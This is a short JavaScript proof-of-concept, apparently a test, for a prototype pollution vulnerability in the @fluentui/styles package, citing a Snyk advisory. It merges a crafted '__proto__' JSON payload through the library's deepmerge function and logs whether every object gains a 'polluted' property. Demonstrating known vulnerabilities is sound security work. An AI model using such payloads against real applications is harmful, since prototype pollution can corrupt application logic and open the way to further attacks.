// //https://snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808

// test("prototype pollution in @fluentui/style ", () => {
  const styles = require("@fluentui/styles");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  const source2 = {
    k3: {},
  };

console.log({}.polluted);

  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));

console.log({}.polluted);
// });
